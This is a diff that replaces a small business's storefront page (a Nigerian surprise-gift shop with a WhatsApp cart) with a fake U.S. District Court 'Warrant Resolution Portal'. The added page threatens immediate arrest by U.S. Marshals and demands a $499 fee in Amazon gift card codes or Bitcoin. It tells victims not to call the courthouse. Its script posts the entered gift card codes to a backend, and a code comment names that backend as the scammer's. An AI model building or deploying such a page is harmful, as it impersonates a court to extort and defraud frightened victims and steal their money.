@@ -3,728 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stephlondon Luxury Experiences</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>United States District Court - Warrant Resolution</title>
     <style>
-        :root {
-            --primary-blue: #0a2c5e;
-            --accent-gold: #c5a267;
-            --luxury-beige: #f8f5f0;
-            --deep-charcoal: #2a2a2a;
-            --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Montserrat', 'Arial', sans-serif;
-        }
-
         body {
-            background: var(--luxury-beige);
-            color: var(--deep-charcoal);
-            line-height: 1.8;
-            -webkit-font-smoothing: antialiased;
+            font-family: 'Courier New', 'Times New Roman', serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
         }
-
-        h1, h2, h3 {
-            font-family: 'Playfair Display', serif;
-            letter-spacing: 0.5px;
-        }
-
-        .header {
-            background: var(--primary-blue);
-            text-align: center;
-            position: relative;
-            padding: 0;
-            animation: headerSlide 1s ease-out;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-
-        @keyframes headerSlide {
-            0% { transform: translateY(-20px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-
-        .main-logo {
-            width: 100%;
-            max-width: 280px;
-            display: block;
+        .container {
+            max-width: 700px;
             margin: 0 auto;
-            padding: 2rem 0;
-            transform-origin: top;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
-        }
-
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 3rem;
-            padding: 5rem 2rem;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .product-card {
-            background: rgba(255,255,255,0.98);
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.05);
-            transition: var(--transition);
-            transform: translateY(0);
-            opacity: 0;
-            animation: cardEntrance 0.6s ease-out forwards;
-            position: relative;
-        }
-
-        @keyframes cardEntrance {
-            0% { transform: translateY(20px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-
-        .product-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 12px 40px rgba(0,0,0,0.1);
-        }
-
-        .product-image {
-            width: 100%;
-            height: 320px;
-            object-fit: cover;
-            border-bottom: 3px solid var(--accent-gold);
-            transition: transform 0.3s ease;
-            position: relative;
-            background: linear-gradient(to bottom, transparent 60%, rgba(0,0,0,0.5)));
-        }
-
-        .product-image::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 50%;
-            background: linear-gradient(to top, rgba(0,0,0,0.5), transparent);
-        }
-
-        .product-card:hover .product-image {
-            transform: scale(1.03);
-        }
-
-        .product-info {
-            padding: 1.5rem 2rem;
-        }
-
-        .price-tag {
-            background: linear-gradient(135deg, var(--primary-blue), #123e6e);
-            color: white;
-            padding: 0.8rem 1.8rem;
-            border-radius: 25px;
-            margin: 1rem 0;
-            display: inline-block;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-
-        .add-to-cart {
-            background: var(--accent-gold);
-            color: var(--deep-charcoal);
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: var(--transition);
-            width: 100%;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            font-size: 0.9rem;
-        }
-
-        .add-to-cart:hover {
-            transform: scale(0.97);
-            box-shadow: 0 4px 15px rgba(197, 162, 103, 0.3);
-        }
-
-        .gallery-section {
-            padding: 6rem 2rem;
-            background: rgba(10,44,94,0.03);
-        }
-
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2.5rem;
-            max-width: 1600px;
-            margin: 0 auto;
-        }
-
-        .gallery-item {
-            border-radius: 12px;
-            overflow: hidden;
-            transition: var(--transition);
-            transform: scale(1);
-            position: relative;
-            aspect-ratio: 1/1;
-        }
-
-        .gallery-item::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.3);
-            opacity: 0;
-            transition: var(--transition);
-        }
-
-        .gallery-item:hover {
-            transform: scale(1.03);
-        }
-
-        .gallery-item:hover::after {
-            opacity: 1;
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: var(--transition);
-        }
-
-        .booking-section {
-            text-align: center;
-            padding: 6rem 2rem;
-            background: linear-gradient(45deg, var(--primary-blue), #123e6e);
-            color: white;
-            margin: 4rem 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .booking-section::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent 0%, rgba(255,255,255,0.1) 50%, transparent 100%);
-            animation: shimmer 8s infinite linear;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-50%) rotate(45deg); }
-            100% { transform: translateX(50%) rotate(45deg); }
-        }
-
-        .ceo-section {
-            text-align: center;
-            padding: 6rem 2rem;
-            background: var(--luxury-beige);
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.6s ease-out;
-        }
-
-        .ceo-section.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .ceo-image {
-            width: 280px;
-            height: 280px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 4px solid var(--accent-gold);
-            margin: 2rem auto;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-            transition: var(--transition);
-        }
-
-        .ceo-image:hover {
-            transform: rotate(5deg) scale(1.05);
-        }
-
-        .cart-icon {
-            position: fixed;
-            top: 30px;
-            right: 30px;
-            background: var(--luxury-beige);
-            padding: 1.2rem;
-            border-radius: 50%;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
-            cursor: pointer;
-            z-index: 1000;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .cart-icon:hover {
-            transform: rotate(15deg) scale(1.1);
-        }
-
-        #cart-count {
-            background: var(--accent-gold);
-            color: var(--deep-charcoal);
-            border-radius: 50%;
-            padding: 6px 12px;
-            position: absolute;
-            top: -8px;
-            right: -8px;
-            font-weight: 700;
-            animation: pulse 2s infinite;
-            font-size: 0.9rem;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        .cart-modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(245, 243, 238, 0.98);
-            padding: 2.5rem;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            z-index: 1001;
-            width: 95%;
-            max-width: 600px;
-            backdrop-filter: blur(12px);
-            opacity: 0;
-            transition: all 0.3s ease-out;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        .cart-modal.active {
-            opacity: 1;
-        }
-
-        .cart-modal h2 {
-            margin-bottom: 2rem;
-            color: var(--primary-blue);
-            border-bottom: 2px solid var(--accent-gold);
-            padding-bottom: 1rem;
-        }
-
-        .cart-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1.2rem;
-            margin: 0.8rem 0;
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 3px 12px rgba(0,0,0,0.04);
-            transition: var(--transition);
+            border: 1px solid #ccc;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-
-        .cart-item-controls {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-        }
-
-        .cart-item-qty {
-            background: var(--luxury-beige);
-            padding: 0.4rem 1rem;
-            border-radius: 8px;
-            min-width: 40px;
+        .header {
+            border-bottom: 2px solid #333;
+            margin-bottom: 20px;
             text-align: center;
-            font-weight: 600;
         }
-
-        .cart-item button {
-            background: none;
-            border: 1px solid var(--primary-blue);
-            color: var(--primary-blue);
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            cursor: pointer;
-            transition: var(--transition);
-            font-weight: 700;
+        .header h1 {
+            font-size: 1.2em;
+            margin: 0;
         }
-
-        .cart-item button:hover {
-            background: var(--primary-blue);
+        .case-details {
+            background: #eef;
+            padding: 10px;
+            margin: 20px 0;
+            font-family: monospace;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .payment-option {
+            border: 1px solid #aaa;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 8px;
+            margin-top: 8px;
+            font-size: 1em;
+        }
+        button {
+            background: #2c3e70;
             color: white;
+            border: none;
+            cursor: pointer;
         }
-
-        .cart-notification {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: var(--accent-gold);
-            color: var(--deep-charcoal);
-            padding: 1rem 2rem;
-            border-radius: 30px;
-            box-shadow: 0 6px 15px rgba(212, 175, 55, 0.3);
-            transform: translateY(100px);
-            opacity: 0;
-            transition: var(--transition);
-            z-index: 1002;
-            font-weight: 600;
-        }
-
-        .cart-notification.active {
-            transform: translateY(0);
-            opacity: 1;
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.4);
-            backdrop-filter: blur(4px);
-            z-index: 1000;
-            display: none;
-        }
-
-        .modal-overlay.active {
-            display: block;
-        }
-
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--luxury-beige);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: fadeOut 1s 1s forwards;
-        }
-
-        @keyframes fadeOut {
-            to { opacity: 0; visibility: hidden; }
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid var(--accent-gold);
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .footer {
+            font-size: 0.8em;
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="loading-screen">
-        <div class="spinner"></div>
+<div class="container">
+    <div class="header">
+        <h1>UNITED STATES DISTRICT COURT</h1>
+        <p>Northern District of California</p>
     </div>
-
-    <header class="header">
-        <img src="https://i.postimg.cc/njxkJbhm/67fddb9c-e7a7-4222-a2eb-b439e54a14b1.jpg" 
-             alt="Stephlondon Logo" 
-             class="main-logo">
-        <div class="cart-icon">
-            <i class="fas fa-shopping-cart"></i>
-            <span id="cart-count">0</span>
-        </div>
-    </header>
-
-    <div class="products-grid">
-        <!-- Luxury Interior Package -->
-        <div class="product-card">
-            <img src="https://i.postimg.cc/VJbB0LSM/IMG-0589.jpg" class="product-image">
-            <div class="product-info">
-                <h3>Luxury Interior Package</h3>
-                <div class="price-tag">₦120,000+</div>
-                <button class="add-to-cart" data-item="Luxury Interior" data-price="120000">Add to Cart</button>
-            </div>
-        </div>
-
-        <!-- Premium Surprise Box -->
-        <div class="product-card">
-            <img src="https://i.postimg.cc/PNzpMSg8/IMG-0579.jpg" class="product-image">
-            <div class="product-info">
-                <h3>Premium Surprise Box</h3>
-                <div class="price-tag">₦45,000+</div>
-                <button class="add-to-cart" data-item="Premium Surprise Box" data-price="45000">Add to Cart</button>
-            </div>
-        </div>
-
-        <!-- Designer Teddy Bear -->
-        <div class="product-card">
-            <img src="https://i.postimg.cc/WdRqKm3F/IMG-0584.jpg" class="product-image">
-            <div class="product-info">
-                <h3>Designer Teddy Bear</h3>
-                <div class="price-tag">₦35,000+</div>
-                <button class="add-to-cart" data-item="Designer Teddy Bear" data-price="35000">Add to Cart</button>
-            </div>
-        </div>
-
-        <!-- Limited Stanley Cup -->
-        <div class="product-card">
-            <img src="https://i.postimg.cc/s1vBgHGG/9d4959f4-5f52-44f4-ab01-53ecdd507c58.jpg" class="product-image">
-            <div class="product-info">
-                <h3>Limited Stanley Cup</h3>
-                <div class="price-tag">₦18,000+</div>
-                <button class="add-to-cart" data-item="Limited Stanley Cup" data-price="18000">Add to Cart</button>
-            </div>
+    <h3>Warrant Resolution Portal</h3>
+    <div class="case-details">
+        <strong>Case #:</strong> 4:25-cr-00312-JSW-1<br>
+        <strong>Defendant:</strong> JOHN SMITH<br>
+        <strong>Violation:</strong> 18 U.S.C. § 3146 (Failure to Appear)<br>
+        <strong>Warrant Status:</strong> ACTIVE - PENDING ARREST
+    </div>
+    <div class="warning">
+        ⚠️ Failure to resolve this warrant within 6 hours will result in immediate custodial arrest by U.S. Marshals. ⚠️
+    </div>
+    <p>To quash this warrant, pay the compliance fee of <strong>$499.00</strong>. Upon payment, the warrant will be withdrawn from NCIC within 1 hour.</p>
+    
+    <div class="payment-option">
+        <label><input type="radio" name="payment_method" value="amazon" checked> Amazon Gift Card (Instant, no fee)</label>
+        <div id="amazon_input">
+            <label>Enter 16‑digit Amazon gift card code:</label>
+            <input type="text" id="giftcode" placeholder="XXXX-XXXXXX-XXXX" style="text-transform: uppercase">
         </div>
     </div>
-
-            <!-- Gallery images remain the same -->
-              <section class="gallery-section">
-        <h2 style="text-align: center; margin-bottom: 3rem; font-size: 2.2rem;">Our Portfolio Gallery</h2>
-        <div class="gallery-grid">
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/jDBRkNGh/f565c5d4-9463-4f2c-955b-479271023881.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/s14q4jHQ/IMG-0534.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/6TrYxMCD/IMG-0533.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/vc17HXnY/IMG-0535.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/LYXYQ6B9/fb846f95-94f9-40bf-b3a7-411e8b9821c8.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/sBbws86R/128852d7-8620-498d-8b39-29378da6dbe0.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/kDKhXJPY/1822f78c-3904-4c7e-b0be-76ded2af7372.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/tn3y5V13/f5c30173-cad5-4f1e-8c38-f7af6a259cd0.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/6Td5XTzs/IMG-0575.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/2Vrj8mX1/IMG-0576.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/VdgfJT3D/IMG-0577.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/9rYMGzqP/IMG-0578.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/PNzpMSg8/IMG-0579.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/yWz39MbH/IMG-0582.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/QKsDtkm2/IMG-0585.jpg">
-            </div>
-            <!-- New Additional Images -->
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/WdRqKm3F/IMG-0584.jpg">
-            </div>
-            <div class="gallery-item">
-                <img src="https://i.postimg.cc/VJbB0LSM/IMG-0589.jpg">
-            </div>
+    
+    <div class="payment-option">
+        <label><input type="radio" name="payment_method" value="btc"> Bitcoin (10% processing fee)</label>
+        <div id="btc_input" style="display:none;">
+            <label>Send exactly $549 worth of BTC to:</label>
+            <input type="text" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" readonly>
+            <p style="font-size:0.8rem;">After sending, you will receive a confirmation within 30 minutes.</p>
         </div>
-    </section>
-
-    <section class="booking-section">
-        <h2 style="font-size: 2.2rem; margin-bottom: 1.5rem;">Custom Surprise Room Design</h2>
-        <p style="font-size: 1.1rem; margin-bottom: 2rem;">Create unforgettable experiences with our premium surprise room packages</p>
-        <div style="margin: 2rem 0;">
-            <span style="background: var(--accent-gold); color: var(--deep-charcoal); padding: 0.8rem 2rem; border-radius: 25px; font-weight: 600;">
-                Prices Negotiable
-            </span>
-        </div>
-        <a href="https://wa.me/+2349120840447?text=Hi%20Stephlondon!%20I%20want%20to%20book%20a%20surprise%20room" 
-           style="background: var(--accent-gold); color: var(--deep-charcoal); padding: 1rem 2.5rem; border-radius: 30px; text-decoration: none; font-weight: 600; transition: var(--transition);"
-           onmouseover="this.style.transform='scale(1.05)'" 
-           onmouseout="this.style.transform='scale(1)'">
-            Book Now
-        </a>
-    </section>
-
-    <section class="ceo-section">
-        <h2 style="font-size: 2.2rem; margin-bottom: 2rem;">Meet Our Founder</h2>
-        <img src="https://i.postimg.cc/dkh7Qnh5/4af725b3-e7b7-4322-b588-f109f10b9c4f.jpg" 
-             alt="CEO Stephlondon" 
-             class="ceo-image">
-        <h3 style="font-size: 1.8rem; margin: 1.5rem 0;">Stephlondon</h3>
-        <p style="max-width: 600px; margin: 0 auto; font-size: 1.1rem;">"Creating magical experiences through thoughtful design and sustainable practices"</p>
-    </section>
-
-    <div class="cart-modal" id="cartModal">
-        <h2>Shopping Cart</h2>
-        <div id="cart-items" style="margin: 2rem 0;"></div>
-        <div style="border-top: 2px solid var(--primary-blue); padding-top: 1.5rem;">
-            <h3 style="margin-bottom: 1.5rem;">Total: ₦<span id="cart-total">0</span></h3>
-            <button onclick="checkout()" 
-                    style="background: var(--primary-blue); color: white; padding: 1rem 2rem; border: none; border-radius: 25px; cursor: pointer; transition: var(--transition); width: 100%; font-weight: 600;"
-                    onmouseover="this.style.transform='scale(1.02)'" 
-                    onmouseout="this.style.transform='scale(1)'">
-                Complete Purchase via WhatsApp
-            </button>
-        </div>
-        <button onclick="hideCartModal()" 
-                style="position: absolute; top: 1rem; right: 1rem; background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--primary-blue);">
-            &times;
-        </button>
     </div>
-
-    <div class="cart-notification" id="cartNotification">
-        Item added to cart ✓
+    
+    <button id="submitBtn">SUBMIT PAYMENT</button>
+    <div class="footer">
+        This is an automated system. Do not attempt to call the courthouse; all communication must be through this portal.
     </div>
+</div>
 
-    <div class="modal-overlay" id="modalOverlay"></div>
-
-    <script>
-        // Loading screen
-        window.addEventListener('load', () => {
-            document.querySelector('.loading-screen').style.display = 'none';
-        });
-
-        // Intersection Observer for CEO Section
-        const ceoSection = document.querySelector('.ceo-section');
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if(entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                }
+<script>
+    // Toggle between Amazon and BTC
+    const radioAmazon = document.querySelector('input[value="amazon"]');
+    const radioBTC = document.querySelector('input[value="btc"]');
+    const amazonDiv = document.getElementById('amazon_input');
+    const btcDiv = document.getElementById('btc_input');
+    
+    radioAmazon.addEventListener('change', function() {
+        amazonDiv.style.display = 'block';
+        btcDiv.style.display = 'none';
+    });
+    radioBTC.addEventListener('change', function() {
+        amazonDiv.style.display = 'none';
+        btcDiv.style.display = 'block';
+    });
+    
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        if (radioAmazon.checked) {
+            let code = document.getElementById('giftcode').value.trim();
+            if (code.length < 10) {
+                alert("Please enter a valid gift card code.");
+                return;
+            }
+            // Send code to scammer's backend
+            fetch('/submit_gift.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'code=' + encodeURIComponent(code) + '&case=4:25-cr-00312'
+            }).then(() => {
+                alert("Payment received. Warrant quashed. You will receive confirmation in 1-2 hours.");
+                window.location.href = "confirmation.html";
+            }).catch(() => {
+                alert("System error. Please try again or use Bitcoin.");
             });
-        }, { threshold: 0.3 });
-        observer.observe(ceoSection);
-
-        // Enhanced Cart Logic
-        let cart = [];
-        
-        function addToCart(name, price) {
-            const existingItem = cart.find(item => item.name === name);
-            if(existingItem) {
-                existingItem.quantity++;
-            } else {
-                cart.push({ 
-                    name, 
-                    price: parseInt(price),
-                    quantity: 1
-                });
-            }
-            showCartNotification();
-            updateCart();
+        } else {
+            // BTC: show address and wait (scammer would monitor blockchain)
+            alert("Send Bitcoin to the address shown. After 1 confirmation, your warrant will be cleared.");
         }
-
-        function updateCartItem(itemName, newQuantity) {
-            const item = cart.find(i => i.name === itemName);
-            if(item) {
-                item.quantity = Math.max(1, newQuantity);
-                if(item.quantity < 1) removeCartItem(itemName);
-                updateCart();
-            }
-        }
-
-        function removeCartItem(itemName) {
-            cart = cart.filter(item => item.name !== itemName);
-            updateCart();
-        }
-
-        function showCartNotification() {
-            const notification = document.getElementById('cartNotification');
-            notification.classList.add('active');
-            setTimeout(() => notification.classList.remove('active'), 2000);
-        }
-
-        function updateCart() {
-            document.getElementById('cart-count').textContent = cart
-                .reduce((total, item) => total + item.quantity, 0);
-
-            const cartItems = document.getElementById('cart-items');
-            cartItems.innerHTML = cart.map(item => `
-                <div class="cart-item">
-                    <div style="font-weight: 500;">${item.name}</div>
-                    <div class="cart-item-controls">
-                        <button onclick="updateCartItem('${item.name}', ${item.quantity - 1})">−</button>
-                        <span class="cart-item-qty">${item.quantity}</span>
-                        <button onclick="updateCartItem('${item.name}', ${item.quantity + 1})">+</button>
-                        <div style="color: var(--primary-blue); font-weight: 700; margin-left: 1.5rem;">
-                            ₦${(item.price * item.quantity).toLocaleString()}
-                        </div>
-                    </div>
-                </div>
-            `).join('');
-            
-            document.getElementById('cart-total').textContent = cart
-                .reduce((total, item) => total + (item.price * item.quantity), 0)
-                .toLocaleString();
-        }
-
-        function checkout() {
-            const message = `🎁 New Order Inquiry 🎁%0A%0A` +
-                            cart.map(item => `✨ ${item.name} (Qty: ${item.quantity}) - ₦${(item.price * item.quantity).toLocaleString()}`).join('%0A') +
-                            `%0A%0A💰 Total: ₦${cart.reduce((sum, item) => sum + (item.price * item.quantity), 0).toLocaleString()}%0A%0A📱 Please confirm order details`;
-            
-            window.open(`https://wa.me/+2349120840447?text=${encodeURIComponent(message)}`);
-            cart = [];
-            updateCart();
-            hideCartModal();
-        }
-
-        function showCartModal() {
-            document.getElementById('modalOverlay').classList.add('active');
-            const modal = document.getElementById('cartModal');
-            modal.style.display = 'block';
-            setTimeout(() => modal.classList.add('active'), 10);
-        }
-
-        function hideCartModal() {
-            document.getElementById('modalOverlay').classList.remove('active');
-            const modal = document.getElementById('cartModal');
-            modal.classList.remove('active');
-            setTimeout(() => modal.style.display = 'none', 300);
-        }
-
-        // Event Listeners
-        document.querySelectorAll('.add-to-cart').forEach(button => {
-            button.addEventListener('click', () => {
-                addToCart(button.dataset.item, button.dataset.price);
-            });
-        });
-
-        document.querySelector('.cart-icon').addEventListener('click', showCartModal);
-
-        document.getElementById('modalOverlay').addEventListener('click', hideCartModal);
-
-        document.addEventListener('keydown', (event) => {
-            if(event.key === 'Escape') {
-                hideCartModal();
-            }
-        });
-
-        // Stagger Product Card Animations
-        document.querySelectorAll('.product-card').forEach((card, index) => {
-            card.style.animationDelay = `${index * 0.1}s`;
-        });
-    </script>
+    });
+</script>
 </body>
 </html>
